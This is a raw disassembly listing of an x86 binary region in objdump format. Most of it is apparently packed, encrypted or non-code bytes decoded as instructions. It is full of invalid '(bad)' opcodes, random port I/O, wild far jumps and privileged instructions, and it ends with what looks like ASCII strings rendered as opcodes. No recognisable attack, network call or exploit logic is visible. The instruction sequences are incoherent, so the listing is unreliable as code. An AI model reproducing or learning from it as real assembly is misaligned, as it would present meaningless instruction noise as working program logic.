  40ffe4:	lods   eax,DWORD PTR ds:[esi]
  40ffe5:	test   ebp,ecx
  40ffe7:	pop    esp
  40ffe8:	outs   dx,BYTE PTR ds:[esi]
  40ffe9:	push   0xffffff96
  40ffeb:	mov    bh,0xa2
  40ffed:	or     cl,BYTE PTR [ecx-0x5]
  40fff0:	add    DWORD PTR [edx+0x3a],esi
  40fff3:	mov    fs,WORD PTR [edi]
  40fff5:	mov    dh,0x13
  40fff7:	and    DWORD PTR [esi+0x57007e38],ecx
  40fffd:	jg     0x410045
  40ffff:	jns    0x40ffd1
  410001:	stos   DWORD PTR es:[edi],eax
  410002:	xchg   esi,eax
  410003:	stos   DWORD PTR es:[edi],eax
  410004:	push   gs
  410006:	jbe    0x40ffa6
  410008:	and    al,0xa0
  41000a:	cmp    BYTE PTR [ebp+0x669cebbf],dh
  410010:	pop    edx
  410011:	sub    ch,bh
  410013:	dec    edx
  410014:	dec    edi
  410015:	or     ah,BYTE PTR [ebx]
  410017:	call   0x8886:0x2ec4f2b5
  41001e:	pop    edx
  41001f:	out    dx,eax
  410020:	pop    ebp
  410021:	sbb    al,0x18
  410023:	mov    eax,0xbee8f343
  410028:	cmp    al,0x80
  41002a:	push   ebx
  41002b:	lea    esi,[eax]
  41002d:	(bad)  
  41002e:	pop    ecx
  41002f:	inc    esp
  410030:	retf   0x23b5
  410033:	outs   dx,BYTE PTR ds:[esi]
  410034:	cmp    DWORD PTR [esi],esi
  410036:	sbb    al,0x86
  410038:	push   edx
  410039:	cli    
  41003a:	repnz ficom DWORD PTR [eax-0x52]
  41003e:	sbb    BYTE PTR [ebx+0x60131748],dh
  410044:	dec    ebx
  410045:	mov    cl,0xfc
  410047:	pop    DWORD PTR [edi]
  410049:	test   BYTE PTR [esi],al
  41004b:	cmp    eax,0x27c1d58a
  410050:	js     0x410089
  410052:	jo     0x41003a
  410054:	retf   0x6cc7
  410057:	jp     0x40fff2
  410059:	ret    0x4943
  41005c:	repz push ss
  41005e:	rcr    dl,1
  410060:	scas   al,BYTE PTR es:[edi]
  410061:	fwait
  410062:	retf   0x2dd8
  410065:	sar    bh,1
  410067:	or     al,0xb0
  410069:	jmp    DWORD PTR [ebp+0x4f]
  41006c:	fcom   DWORD PTR [edx]
  41006e:	(bad)  
  41006f:	scas   eax,DWORD PTR es:[edi]
  410070:	sub    eax,0x600c7630
  410075:	add    DWORD PTR [edi+0x15],ecx
  410078:	lods   eax,DWORD PTR ds:[esi]
  410079:	push   esp
  41007a:	mov    edi,0x6d76fe55
  41007f:	mov    ds:0x593cf363,eax
  410084:	and    esi,DWORD PTR [eax-0x39]
  410087:	mov    al,0xb5
  410089:	in     al,dx
  41008a:	mov    bh,0xf5
  41008c:	sar    BYTE PTR [ecx+0x1b],1
  41008f:	mov    bl,0xe2
  410091:	ins    DWORD PTR es:[edi],dx
  410092:	lahf   
  410093:	pop    ss
  410094:	or     ah,bl
  410096:	ret    0x3c1f
  410099:	xchg   DWORD PTR [edi],ebp
  41009b:	fwait
  41009c:	call   0xfa76b171
  4100a1:	das    
  4100a2:	enter  0xabdd,0x57
  4100a6:	jge    0x410037
  4100a8:	xor    eax,0x5987e03b
  4100ad:	test   DWORD PTR [esi],0x1854848
  4100b3:	adc    BYTE PTR [ecx-0x5248da75],0x9d
  4100ba:	sub    edi,DWORD PTR [edx]
  4100bc:	mov    esp,0xbd6f4763
  4100c1:	(bad)  
  4100c2:	outs   dx,BYTE PTR ds:[esi]
  4100c3:	lea    edi,[edi-0x2d]
  4100c6:	not    BYTE PTR ds:0x9d8ce220
  4100cc:	aad    0xff
  4100ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100cf:	mov    ebx,DWORD PTR [edx+edx*2-0x9]
  4100d3:	test   BYTE PTR [ebx-0x6d],ah
  4100d6:	dec    edx
  4100d7:	xchg   ecx,eax
  4100d8:	in     eax,0xc5
  4100da:	out    0x9f,eax
  4100dc:	loopne 0x41012b
  4100de:	cld    
  4100df:	rcr    DWORD PTR [eax+0x2b0531e],cl
  4100e5:	cld    
  4100e6:	xchg   BYTE PTR [edi-0x64075896],ch
  4100ec:	fsubr  QWORD PTR [esi-0x211f81f3]
  4100f2:	jecxz  0x410159
  4100f4:	mov    ebx,esi
  4100f6:	aad    0x85
  4100f8:	icebp  
  4100f9:	add    ebp,DWORD PTR [edx+0x53d2ad95]
  4100ff:	jnp    0x41010b
  410101:	js     0x410086
  410103:	xchg   esp,eax
  410104:	jo     0x4100b1
  410106:	cmp    DWORD PTR [ebp-0x5d],ebp
  410109:	cli    
  41010a:	ret    0x5757
  41010d:	sahf   
  41010e:	xchg   ebp,eax
  41010f:	or     DWORD PTR [edi-0x7471d83],esi
  410115:	mov    ch,0xce
  410117:	mov    ebp,0xb560e3a8
  41011c:	and    eax,0x9a49b06c
  410121:	xor    al,0x1b
  410123:	retf   
  410124:	add    DWORD PTR [edi+0x67],esp
  410127:	mov    edx,0xa4fa6882
  41012c:	fnstcw WORD PTR [ebp+0x535ee4b1]
  410132:	xor    bh,0xe4
  410135:	fs mov dl,0x1f
  410138:	cdq    
  410139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41013a:	data16 fst DWORD PTR [esi]
  41013d:	adc    bh,BYTE PTR [edx+ecx*8+0x4eb3767f]
  410144:	adc    eax,0xae7741b0
  410149:	cwde   
  41014a:	mov    esi,0x8a0d8191
  41014f:	cmp    DWORD PTR [edi+0x2b],ecx
  410152:	jnp    0x4100dc
  410154:	add    eax,0x7bd0f335
  410159:	sti    
  41015a:	push   ebx
  41015b:	repz add ebx,DWORD PTR [ecx+0x22]
  41015f:	sbb    ebp,esp
  410161:	sbb    cl,BYTE PTR ds:0x8accedfe
  410167:	pop    esp
  410168:	inc    edx
  410169:	sub    bh,bl
  41016b:	jo     0x41011f
  41016d:	out    dx,al
  41016e:	imul   esi,DWORD PTR [ebp+0x3f],0x24
  410172:	jb     0x4101c7
  410174:	rol    DWORD PTR [edx-0x726aba6d],cl
  41017a:	jns    0x410140
  41017c:	mov    ds,WORD PTR [esi+0x33]
  41017f:	dec    esp
  410180:	sub    DWORD PTR [eax-0x79e3bd5],ecx
  410186:	ja     0x4101ef
  410188:	(bad)  
  410189:	pushf  
  41018a:	jg     0x4101de
  41018c:	fnstenv [edi-0x55ce73b4]
  410192:	sahf   
  410193:	retf   
  410194:	mov    al,0x31
  410196:	mov    ds:0xf7c407b8,al
  41019b:	push   es
  41019c:	outs   dx,BYTE PTR ds:[esi]
  41019d:	js     0x410201
  41019f:	ja     0x4101eb
  4101a1:	ror    BYTE PTR [esi],1
  4101a3:	mov    bl,0x2b
  4101a5:	loopne 0x410134
  4101a7:	and    BYTE PTR [esi+0x206aa431],ah
  4101ad:	repnz test ebp,ebx
  4101b0:	out    dx,al
  4101b1:	aad    0xaa
  4101b3:	in     al,dx
  4101b4:	pop    eax
  4101b5:	(bad)  
  4101b6:	ds add esi,esp
  4101b9:	sbb    ah,0x9
  4101bc:	xor    DWORD PTR [esi+0x4f026f5f],edi
  4101c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101c3:	mov    ecx,0xbb5747ac
  4101c8:	mov    ds:0x2cba5dc6,al
  4101cd:	jae    0x410207
  4101cf:	or     edi,ebx
  4101d1:	mov    cs,WORD PTR [edx+0x42]
  4101d4:	pop    DWORD PTR [eax]
  4101d6:	push   0xffffffd5
  4101d8:	das    
  4101d9:	addr16 test eax,0x25b170ed
  4101df:	mov    esi,0x612ffa96
  4101e4:	sbb    BYTE PTR [ebp-0x5e71befb],dl
  4101ea:	repnz cmp al,0x8c
  4101ed:	mov    ebp,0xef0e90e3
  4101f2:	into   
  4101f3:	pop    ss
  4101f4:	pop    esi
  4101f5:	pop    es
  4101f6:	mov    al,ds:0x90d75cce
  4101fb:	jl     0x410225
  4101fd:	pop    ebp
  4101fe:	pop    ss
  4101ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410200:	call   0x1b0bd628
  410205:	out    0x28,eax
  410207:	jg     0x4101a4
  410209:	mov    eax,ds:0xb5c37fbf
  41020e:	sub    al,0xe7
  410210:	push   cs
  410211:	xor    al,0x1a
  410213:	add    eax,0xffb4f115
  410218:	in     al,dx
  410219:	jne    0x410264
  41021b:	cli    
  41021c:	add    eax,0x21c015e4
  410221:	imul   esp,ecx,0x44
  410224:	and    al,0x33
  410226:	gs pop es
  410228:	mov    bl,0x6a
  41022a:	lods   al,BYTE PTR ds:[esi]
  41022b:	pop    es
  41022c:	mov    eax,ds:0xcf202b8e
  410231:	ins    DWORD PTR es:[edi],dx
  410232:	cmp    al,0x96
  410234:	jb     0x4101cb
  410236:	bound  esp,QWORD PTR [edx-0x49647ea7]
  41023c:	mov    al,0xf7
  41023e:	lock stc 
  410240:	mov    dh,0x20
  410242:	daa    
  410243:	pushf  
  410244:	lds    ecx,FWORD PTR [ebx-0x1f237e57]
  41024a:	xor    al,0xee
  41024c:	cmp    BYTE PTR [edx-0x31],bl
  41024f:	(bad)  
  410250:	sar    BYTE PTR [edi-0x3a1c5233],cl
  410256:	dec    ecx
  410257:	mov    esi,0x5d59bdeb
  41025c:	dec    esp
  41025d:	and    edi,DWORD PTR [edx+eiz*2+0x1524d614]
  410264:	(bad)  
  410268:	(bad)
  41026b:	aas    
  41026c:	or     BYTE PTR [edx+0x7776a0bc],dl
  410272:	pop    ebp
  410273:	and    edx,DWORD PTR [edx-0x24]
  410276:	clc    
  410277:	(bad)  
  410278:	aas    
  410279:	in     al,dx
  41027a:	jns    0x4102d8
  41027c:	into   
  41027d:	xchg   ecx,eax
  41027e:	div    eax
  410280:	sbb    al,bl
  410282:	mov    edi,0x4f961b48
  410287:	sbb    edi,DWORD PTR [ebx-0x3d57fc84]
  41028d:	push   0x18087a76
  410292:	sbb    edx,DWORD PTR [edi+esi*2]
  410295:	jecxz  0x4102f4
  410297:	lods   eax,DWORD PTR ds:[esi]
  410298:	out    0x29,al
  41029a:	or     edi,DWORD PTR [esi+eax*1+0xa]
  41029e:	ins    DWORD PTR es:[edi],dx
  41029f:	push   esi
  4102a0:	mov    al,ds:0x3e862e08
  4102a5:	jl     0x4102e6
  4102a7:	jbe    0x41022b
  4102a9:	int3   
  4102aa:	repnz xchg ebx,eax
  4102ac:	mov    ah,0xf0
  4102ae:	in     eax,dx
  4102af:	pop    edx
  4102b0:	inc    ebx
  4102b1:	test   eax,0x7c29e5ca
  4102b6:	adc    BYTE PTR [ecx],al
  4102b8:	(bad)  
  4102b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102ba:	sub    al,dh
  4102bc:	jns    0x410241
  4102be:	cdq    
  4102bf:	in     al,dx
  4102c0:	adc    dh,BYTE PTR [ecx+ebp*2+0x6a]
  4102c4:	adc    eax,0xf1dd7de3
  4102c9:	rol    DWORD PTR [ecx+0x30],1
  4102cc:	les    eax,FWORD PTR [esi+0x27bc99e3]
  4102d2:	or     al,0x8c
  4102d4:	xchg   edx,eax
  4102d5:	xchg   ecx,eax
  4102d6:	xor    DWORD PTR [eax],ecx
  4102d8:	mov    eax,0xfc9118f4
  4102dd:	push   cs
  4102de:	mov    dh,0x41
  4102e0:	mov    WORD PTR [ecx+0x1b0972c3],gs
  4102e6:	mov    ah,0xf6
  4102e8:	pusha  
  4102e9:	sahf   
  4102ea:	pop    eax
  4102eb:	mov    ebp,0x66c864e5
  4102f0:	mov    ebp,0x74915acd
  4102f5:	lea    esi,[edi+0x4068fc3]
  4102fb:	mul    DWORD PTR [edi]
  4102fd:	loope  0x4102dc
  4102ff:	es sub cl,BYTE PTR ss:[esp+esi*4+0x21]
  410305:	push   0x7c7d92df
  41030a:	mov    ebp,0x3832bd64
  41030f:	test   al,0x9
  410311:	jb     0x410355
  410313:	cmp    bh,bh
  410315:	les    esp,FWORD PTR [edi]
  410317:	mov    BYTE PTR [edi],ah
  410319:	loopne 0x4102ce
  41031b:	sbb    eax,0xa7257bc
  410320:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410321:	inc    esi
  410322:	shl    DWORD PTR [edi+ebp*2-0x61],cl
  410326:	mov    al,ds:0x20c9ed80
  41032b:	fwait
  41032c:	xor    edx,esp
  41032e:	stc    
  41032f:	and    al,0x81
  410331:	imul   edx,DWORD PTR [edx+0x83c9e3c],0x7e
  410338:	xchg   edx,eax
  410339:	sbb    al,0x6a
  41033b:	lods   al,BYTE PTR ds:[esi]
  41033c:	sbb    bl,BYTE PTR [edi-0x6efe900f]
  410342:	rol    DWORD PTR [ebx+0x39ac7f4f],1
  410348:	pop    ss
  410349:	stos   BYTE PTR es:[edi],al
  41034a:	mov    edx,0xce966953
  41034f:	setbe  ah
  410352:	ret    0x690f
  410355:	(bad)  
  410356:	and    dl,al
  410358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410359:	outs   dx,BYTE PTR ds:[esi]
  41035a:	jp     0x4102ec
  41035c:	ja     0x410398
  41035e:	das    
  41035f:	mov    DWORD PTR [esi-0x544fbf83],eax
  410365:	cmp    DWORD PTR [ebp+0x33],0x2d1cb595
  41036c:	sbb    BYTE PTR ds:0x49a88bd3,bh
  410372:	popf   
  410373:	mov    dh,0xf3
  410375:	mov    eax,0x1db31622
  41037a:	xor    ebp,ebp
  41037c:	sub    ecx,edx
  41037e:	push   eax
  41037f:	and    ax,0x38e2
  410383:	test   eax,0xf64ad4a4
  410388:	lods   eax,DWORD PTR ds:[esi]
  410389:	out    0x27,al
  41038b:	dec    eax
  41038c:	jl     0x41033b
  41038e:	xor    ebx,DWORD PTR [edi-0x1301a1d9]
  410394:	xor    eax,0x27d7ccfb
  410399:	call   0x35c593b6
  41039e:	bound  ebp,QWORD PTR [ecx+0x9]
  4103a1:	cmp    DWORD PTR [esi],0xeec9c847
  4103a7:	jb     0x4103e7
  4103a9:	xchg   ecx,eax
  4103aa:	push   DWORD PTR [ecx]
  4103ac:	fdivr  QWORD PTR [esi+0x4a8b84ad]
  4103b2:	std    
  4103b3:	aaa    
  4103b4:	and    eax,0x992392bc
  4103b9:	cmp    eax,0xa3b2abb8
  4103be:	jmp    0xca13425d
  4103c3:	adc    BYTE PTR [ecx+0x5dbf4a79],cl
  4103c9:	test   DWORD PTR [eax+0x57ce455c],eax
  4103cf:	inc    eax
  4103d0:	loopne 0x4103aa
  4103d2:	repz rcr DWORD PTR [edi+0x38],1
  4103d6:	ret    0x6b3a
  4103d9:	dec    eax
  4103da:	enter  0x86f5,0x69
  4103de:	outs   dx,DWORD PTR ds:[esi]
  4103df:	cdq    
  4103e0:	mov    bl,0x76
  4103e2:	sub    bh,BYTE PTR [eax+0x8050b89]
  4103e8:	jmp    0x2e93:0xb1a3de47
  4103ef:	icebp  
  4103f0:	pop    ecx
  4103f1:	leave  
  4103f2:	retf   0xc032
  4103f5:	add    al,0x34
  4103f7:	scas   eax,DWORD PTR es:[edi]
  4103f8:	or     al,BYTE PTR [ebx]
  4103fa:	and    eax,0x5f9ec721
  4103ff:	test   al,0xba
  410401:	icebp  
  410402:	in     eax,0xab
  410404:	xor    ecx,0xadf4c399
  41040a:	mov    bl,0xdd
  41040c:	mov    WORD PTR [eax+0x2b1ab663],ss
  410412:	int    0xa0
  410414:	pushf  
  410415:	call   0x33a9:0x6520037f
  41041c:	xchg   DWORD PTR [edi+ebp*4-0x3dec99b1],esi
  410423:	retf   0x742d
  410426:	fisttp DWORD PTR [ecx]
  410428:	pop    ebp
  410429:	scas   al,BYTE PTR es:[edi]
  41042a:	and    BYTE PTR [edx-0x36ecff62],dl
  410430:	xlat   BYTE PTR ds:[ebx]
  410431:	jecxz  0x41045d
  410433:	push   esi
  410434:	mov    eax,0x178c6020
  410439:	cdq    
  41043a:	inc    ecx
  41043b:	fnstenv [esp+eiz*8+0x63]
  41043f:	jge    0x410431
  410441:	out    dx,al
  410442:	outs   dx,DWORD PTR ds:[esi]
  410443:	into   
  410444:	jg     0x410485
  410446:	sahf   
  410447:	sub    BYTE PTR [edx+ecx*8+0xc],cl
  41044b:	cdq    
  41044c:	arpl   WORD PTR [esi],bp
  41044e:	dec    ebx
  41044f:	and    dl,0xf
  410452:	icebp  
  410453:	test   al,0x2d
  410455:	dec    ebx
  410456:	sub    esp,edi
  410458:	pop    es
  410459:	fmul   DWORD PTR [esi+0x5a]
  41045c:	in     al,dx
  41045d:	imul   eax,esi,0xfbe5c4f
  410463:	push   eax
  410464:	in     al,dx
  410465:	dec    edx
  410466:	pop    esp
  410467:	hlt    
  410468:	push   esi
  410469:	ret    0x1c4b
  41046c:	xchg   ecx,eax
  41046d:	sub    edx,ebx
  41046f:	dec    esp
  410470:	xor    eax,0x2e64bc23
  410475:	rcr    BYTE PTR [eax-0x6e],0x53
  410479:	xchg   ecx,eax
  41047a:	shl    esi,1
  41047c:	mov    esi,0xa1c6e2e4
  410481:	gs xchg ebp,esp
  410484:	ja     0x41041a
  410486:	and    BYTE PTR [edx+eax*4+0x6e8ebe7c],dl
  41048d:	push   ebp
  41048e:	and    DWORD PTR [ebx-0x232a8cf],0x23
  410495:	(bad)  
  410496:	fsubr  QWORD PTR [edx+0x3c3e5df1]
  41049c:	js     0x4104a5
  41049e:	and    al,0xb7
  4104a0:	test   DWORD PTR [ebx-0x58],ebx
  4104a3:	add    dl,ah
  4104a5:	arpl   WORD PTR [ecx+0x7cc63152],bp
  4104ab:	pop    ecx
  4104ac:	mul    DWORD PTR [eax+0x23]
  4104af:	pop    edi
  4104b0:	fsubr  DWORD PTR [ebx+0x6ae245d5]
  4104b6:	push   0x3e
  4104b8:	int3   
  4104b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104ba:	out    0xc2,eax
  4104bc:	ficom  DWORD PTR [esi-0x4a70e305]
  4104c2:	or     edx,DWORD PTR [edi-0x4b9323e8]
  4104c8:	mov    ah,0x21
  4104ca:	jno    0x410544
  4104cc:	out    0x77,eax
  4104ce:	adc    DWORD PTR [ebx-0x11],esp
  4104d1:	cs popf 
  4104d3:	cmp    al,0x5
  4104d5:	push   edx
  4104d6:	add    al,0xfe
  4104d8:	fwait
  4104d9:	sahf   
  4104da:	aad    0x8
  4104dc:	adc    dl,BYTE PTR [ecx+eax*2+0x5d]
  4104e0:	sub    eax,0xc5f839d6
  4104e5:	psllq  mm4,QWORD PTR [edx-0x7e]
  4104e9:	jge    0x410499
  4104eb:	hlt    
  4104ec:	(bad)  
  4104ee:	(bad)  
  4104ef:	(bad)  
  4104f0:	or     edi,esp
  4104f2:	jb     0x4104c1
  4104f4:	push   eax
  4104f5:	mov    ?,WORD PTR [eax-0x38]
  4104f8:	sbb    DWORD PTR [ecx],edi
  4104fa:	jmp    0x302c35b6
  4104ff:	je     0x410503
  410501:	lahf   
  410502:	in     eax,0x8a
  410504:	cmc    
  410505:	xor    eax,0xff529ea0
  41050a:	jb     0x41048d
  41050c:	in     al,dx
  41050d:	mov    bl,0x4d
  41050f:	scas   eax,DWORD PTR es:[edi]
  410510:	jae    0x410527
  410512:	inc    eax
  410513:	clc    
  410514:	jmp    0x41053d
  410516:	in     al,0x1c
  410518:	and    ecx,esi
  41051a:	in     al,0xd6
  41051c:	mov    edx,0x49715c43
  410521:	ds jmp 0x5de4b8fa
  410527:	popf   
  410528:	cmp    BYTE PTR [ebp+0x5],dl
  41052b:	stc    
  41052c:	or     DWORD PTR [eax-0x2fedba84],ebx
  410532:	fmul   QWORD PTR [edx]
  410534:	inc    esi
  410535:	inc    ebp
  410536:	mov    fs,WORD PTR ds:0x7309f930
  41053c:	cld    
  41053d:	(bad)  
  41053e:	in     al,dx
  41053f:	int    0x24
  410541:	inc    esp
  410542:	or     BYTE PTR [esi-0x17],dh
  410545:	cwde   
  410546:	nop
  410547:	mov    edx,0x89390e3d
  41054c:	leave  
  41054d:	or     ebp,DWORD PTR [ecx+0x1e]
  410550:	out    0x63,al
  410552:	cmp    BYTE PTR [edx+0x23bbe05a],bh
  410558:	in     al,0x57
  41055a:	push   cs
  41055b:	data16 lahf 
  41055d:	pop    DWORD PTR [ecx-0x61ee3e8d]
  410563:	jnp    0x4105ce
  410565:	and    eax,0x87d94676
  41056a:	fidiv  DWORD PTR [edi+0x67]
  41056d:	mov    esi,0xc1347112
  410572:	push   ds
  410573:	cwde   
  410574:	sbb    edi,edi
  410576:	ds jecxz 0x410538
  410579:	addr16 dec ebx
  41057b:	lods   eax,DWORD PTR ds:[esi]
  41057c:	dec    DWORD PTR [ebp+0x51]
  41057f:	mul    BYTE PTR [esi+0x46650229]
  410585:	and    DWORD PTR [ebp-0x604faf85],edx
  41058b:	aam    0xd4
  41058d:	cld    
  41058e:	pop    ss
  41058f:	stos   DWORD PTR es:[edi],eax
  410590:	push   es
  410591:	sub    eax,0xffffffd0
  410594:	inc    eax
  410595:	arpl   cx,dx
  410597:	adc    DWORD PTR [edi-0x6b9c8c44],ebp
  41059d:	sub    ch,ch
  41059f:	jge    0x4105d0
  4105a1:	push   0xffffffe4
  4105a3:	popa   
  4105a4:	mov    al,0x54
  4105a6:	arpl   ax,cx
  4105a8:	inc    edx
  4105a9:	cmp    al,0xca
  4105ab:	pop    edi
  4105ac:	jo     0x410552
  4105ae:	fisttp QWORD PTR [eax-0x2e]
  4105b1:	ficom  DWORD PTR [edx-0x10]
  4105b4:	(bad)  
  4105b5:	call   FWORD PTR [edi]
  4105b7:	loop   0x41053d
  4105b9:	out    dx,al
  4105ba:	sbb    DWORD PTR [ebp+0x2d],ecx
  4105bd:	pcmpeqb mm6,QWORD PTR [ecx]
  4105c0:	and    BYTE PTR [eax],dl
  4105c2:	pop    ss
  4105c3:	mov    eax,0xdeee5811
  4105c8:	mov    ah,0x47
  4105ca:	mov    ah,0xdf
  4105cc:	adc    BYTE PTR ss:[eax+0x2c],dh
  4105d0:	(bad)  
  4105d1:	fnstcw WORD PTR [esi]
  4105d3:	mov    ch,0xbd
  4105d5:	jo     0x6af85822
  4105db:	sub    al,0xda
  4105dd:	enter  0xcce7,0x80
  4105e1:	jmp    0x76d6:0xfcbe811b
  4105e8:	mov    bh,0x61
  4105ea:	fsub   QWORD PTR [ebx-0x69]
  4105ed:	push   cs
  4105ee:	cmc    
  4105ef:	mov    dl,0x5a
  4105f1:	sub    BYTE PTR [edi+0x6],dl
  4105f4:	jb     0x41058a
  4105f6:	fbld   TBYTE PTR [ebx+0x76]
  4105f9:	xor    BYTE PTR [edi+0x7c],bl
  4105fc:	or     DWORD PTR [ebx+esi*2],esp
  4105ff:	and    BYTE PTR [ecx+ecx*1-0x24],dl
  410603:	icebp  
  410604:	mov    dl,0xbf
  410606:	mov    dl,0xe9
  410608:	cmc    
  410609:	fst    QWORD PTR [eax]
  41060b:	sub    DWORD PTR [eax-0x57],ecx
  41060e:	jle    0x410679
  410610:	mov    eax,0xd631746
  410615:	rol    BYTE PTR [ecx],0x49
  410618:	fnstenv [edi]
  41061a:	pop    ecx
  41061b:	jb     0x410696
  41061d:	popf   
  41061e:	sbb    eax,0xc8c61212
  410623:	ins    BYTE PTR es:[edi],dx
  410624:	outs   dx,DWORD PTR ds:[esi]
  410625:	bound  edx,QWORD PTR [ebx+0x78671818]
  41062b:	push   es
  41062c:	cmp    BYTE PTR [ebx-0x524e4365],bh
  410632:	pop    eax
  410633:	push   0xa14ec76f
  410638:	push   0x78
  41063a:	xchg   DWORD PTR [esi],esi
  41063c:	dec    edx
  41063d:	jbe    0x41060c
  41063f:	jbe    0x410630
  410641:	and    DWORD PTR [edx],0x23d26b83
  410647:	mov    dl,0x9b
  410649:	fbstp  TBYTE PTR es:[ecx+ebx*1]
  41064d:	jg     0x4105d4
  41064f:	mov    edi,DWORD PTR [edx+0x26c2125c]
  410655:	sbb    ch,BYTE PTR [ebx+0x71]
  410658:	scas   al,BYTE PTR es:[edi]
  410659:	aaa    
  41065a:	or     ch,BYTE PTR [esi]
  41065c:	cmp    esp,0xaaf3c927
  410662:	int3   
  410663:	dec    ecx
  410664:	cld    
  410665:	lds    esp,FWORD PTR [ecx-0x7c]
  410668:	fwait
  410669:	mov    edx,0x2deb8b54
  41066e:	bound  ebp,QWORD PTR [esi+0x76a4286f]
  410674:	retf   0x14fc
  410677:	inc    esi
  410678:	loope  0x41066b
  41067a:	pop    edx
  41067b:	inc    ebx
  41067c:	imul   ebp,DWORD PTR [edx],0xffffffe9
  41067f:	push   0xffffffc1
  410681:	mov    BYTE PTR [ebx-0x688ee3ad],0xd
  410688:	push   0xe1dc2657
  41068d:	adc    cl,BYTE PTR [ebx+0x41]
  410690:	cmp    eax,0x9cb89614
  410695:	shl    DWORD PTR [ebx+0x670c9263],0x3d
  41069c:	push   edi
  41069d:	rcr    BYTE PTR [esi],1
  41069f:	out    dx,eax
  4106a0:	gs dec edx
  4106a2:	out    dx,eax
  4106a3:	icebp  
  4106a4:	ret    
  4106a5:	aaa    
  4106a6:	stos   BYTE PTR es:[edi],al
  4106a7:	xor    eax,0x91adb3e9
  4106ac:	sbb    dl,dl
  4106ae:	pushf  
  4106af:	sbb    al,0xf2
  4106b1:	aam    0x19
  4106b3:	inc    edi
  4106b4:	xor    edi,DWORD PTR [ebp-0x19]
  4106b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106b8:	jnp    0x410684
  4106ba:	outs   dx,DWORD PTR ds:[esi]
  4106bb:	xor    DWORD PTR [ecx+edx*2-0x7c],ecx
  4106bf:	sbb    bh,dl
  4106c1:	aas    
  4106c2:	sub    DWORD PTR [ebx-0x37],esi
  4106c5:	imul   ecx,DWORD PTR [ecx],0x67
  4106c8:	xchg   BYTE PTR [ebx+0x30],cl
  4106cb:	mov    edi,0xa4f2516b
  4106d0:	mov    ah,0xd3
  4106d2:	adc    DWORD PTR [edi],0xa4a3bcfc
  4106d8:	mov    ebx,0x5b1020
  4106dd:	out    dx,eax
  4106de:	push   es
  4106df:	fadd   st(3),st
  4106e1:	psrld  mm4,QWORD PTR [edi+0x22]
  4106e5:	scas   al,BYTE PTR es:[edi]
  4106e6:	(bad)  
  4106e7:	les    ecx,FWORD PTR [ebp+0x13]
  4106ea:	push   cs
  4106eb:	stos   DWORD PTR es:[edi],eax
  4106ec:	scas   al,BYTE PTR es:[edi]
  4106ed:	pop    es
  4106ee:	and    esi,edx
  4106f0:	dec    esp
  4106f1:	call   0x27:0x72c97ca2
	...
  41073c:	add    BYTE PTR [eax],al
  41073e:	add    BYTE PTR [ebx+0x1b],bh
  410741:	adc    BYTE PTR [eax],al
  410743:	lods   al,BYTE PTR ds:[esi]
  410744:	push   ebp
  410745:	adc    BYTE PTR [eax],al
  410747:	punpcklwd mm2,DWORD PTR [eax]
  41074a:	add    BYTE PTR [edi+0x6300100d],ch
  410750:	adc    BYTE PTR gs:[eax],al
  410753:	shl    BYTE PTR [edi],0x10
  410756:	add    BYTE PTR [ecx+0x7300101d],dh
  41075c:	js     0x41076e
  41075e:	add    BYTE PTR [ebp+0x38],al
  410761:	xor    eax,0x565f3235
  410766:	aaa    
  410767:	add    BYTE PTR [eax+0x30],dl
  41076a:	push   esp
  41076b:	pop    edi
  41076c:	inc    edi
  41076d:	dec    ebp
  41076e:	xor    bl,BYTE PTR [edx+0x5f]
  410771:	inc    esp
  410772:	ss xor BYTE PTR ss:0x4f494c00,dh
  41077a:	xor    BYTE PTR [edi],dh
  41077c:	pop    edi
  41077d:	dec    edx
  41077e:	inc    ecx
  41077f:	add    BYTE PTR [ecx+0x47],bl
  410782:	pop    edx
  410783:	xor    eax,0x4442595f
  410788:	dec    esi
  410789:	inc    ebx
  41078a:	pop    edi
  41078b:	xor    eax,0x334a0048
  410790:	push   ecx
  410791:	pop    edi
  410792:	xor    al,BYTE PTR [esi+0x35]
  410795:	push   eax
  410796:	cmp    DWORD PTR [eax],edi
  410798:	add    BYTE PTR [ebp+0x32],dl
  41079b:	push   edi
  41079c:	xor    BYTE PTR [edi+0x42],bl
  41079f:	dec    eax
  4107a0:	inc    ebp
  4107a1:	pop    edi
  4107a2:	xor    ebx,DWORD PTR [eax+0x46]
  4107a5:	dec    ebx
  4107a6:	inc    esp
  4107a7:	aaa    
  4107a8:	add    BYTE PTR [edi+0x46],cl
  4107ab:	push   esi
  4107ac:	xor    al,0x34
  4107ae:	pop    edi
  4107af:	inc    edi
  4107b0:	inc    edi
  4107b1:	push   esp
  4107b2:	pop    edx
  4107b3:	inc    edx
  4107b4:	pop    edi
  4107b5:	push   ebp
  4107b6:	add    BYTE PTR [edi+0x41],al
  4107b9:	xor    al,0x39
  4107bb:	xor    BYTE PTR [edi+0x39],bl
  4107be:	inc    edx
  4107bf:	add    BYTE PTR [esi+0x36],cl
  4107c2:	xor    bl,BYTE PTR [edi+0x41]
  4107c5:	xor    ebx,DWORD PTR ss:[edi+0x38]
  4107c9:	xor    eax,DWORD PTR [ecx+0x52]
  4107cc:	push   ebx
  4107cd:	pop    edi
  4107ce:	inc    esi
  4107cf:	add    BYTE PTR [ecx+0x57],al
  4107d2:	push   ebp
  4107d3:	pop    edi
  4107d4:	inc    esi
  4107d5:	pop    edx
  4107d6:	push   ebp
  4107d7:	xor    dh,BYTE PTR [esi]
  4107d9:	add    BYTE PTR [edi+0x48],al
  4107dc:	xor    BYTE PTR [edi+0x33],bl
  4107df:	inc    ebp
  4107e0:	cmp    DWORD PTR [edi+0x5f],ecx
  4107e3:	push   ebx
  4107e4:	cmp    DWORD PTR [eax],eax
  4107e6:	push   esp
  4107e7:	xor    al,0x51
  4107e9:	cmp    BYTE PTR [esi],dh
  4107eb:	pop    edi
  4107ec:	push   esp
  4107ed:	dec    ecx
  4107ee:	dec    edi
  4107ef:	add    BYTE PTR [esp+ecx*2+0x5a],al
  4107f3:	pop    edi
  4107f4:	pop    edx
